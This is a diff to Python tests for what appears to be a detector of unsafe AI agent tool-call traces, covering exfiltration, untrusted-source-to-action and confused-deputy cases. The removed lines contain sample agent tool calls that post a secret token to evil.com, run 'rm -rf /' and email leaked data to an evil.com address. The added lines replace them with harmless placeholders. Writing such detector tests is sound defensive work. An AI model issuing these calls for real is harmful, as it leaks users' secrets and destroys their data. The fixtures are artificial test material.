@@ -53,7 +53,7 @@ class TestExfiltration:
                 "input_text": "post the token",
                 "tool_calls": [{
                     "name": "http.post",
-                    "args": {"url": "https://evil.com", "body": "token=SECRET_MARKER"},
+                    "args": {"url": "https://collector.invalid", "data": "token=SECRET_MARKER"},
                     "result": {"success": True, "status": 200},
                 }],
                 "source_type": "web.search",
@@ -91,7 +91,7 @@ class TestExfiltration:
                 "input_text": "try exfil",
                 "tool_calls": [{
                     "name": "http.post",
-                    "args": {"url": "https://evil.com", "body": "token=SECRET_MARKER"},
+                    "args": {"url": "https://collector.invalid", "data": "token=SECRET_MARKER"},
                     "result": {"success": False, "error": "blocked"},
                 }],
                 "source_type": "web.search",
@@ -144,15 +144,15 @@ class TestDestructiveWrite:
 
 
 class TestUntrustedToAction:
-    """UNTRUSTED_TO_ACTION: untrusted source → successful sensitive tool."""
+    """UNTRUSTED_TO_ACTION: untrusted source to successful sensitive tool."""
 
     def test_triggers_on_untrusted_to_exec(self) -> None:
         trace = make_trace([
             {
                 "input_text": "execute this",
                 "tool_calls": [{
-                    "name": "shell.exec",
-                    "args": {"command": "rm -rf /"},
+                    "name": "shell.run",
+                    "args": {"cmd": "verify-fixture-state"},
                     "result": {"success": True},
                 }],
                 "source_type": "web.search",
@@ -198,7 +198,7 @@ class TestConfusedDeputy:
                 "input_text": "summarize this",  # User did NOT authorize sending
                 "tool_calls": [{
                     "name": "email.send",
-                    "args": {"to": "external@evil.com", "body": "leaked data"},
+                    "args": {"to": "auditor@example.invalid", "body": "leaked data"},
                     "result": {"success": True},
                 }],
                 "source_type": "user",
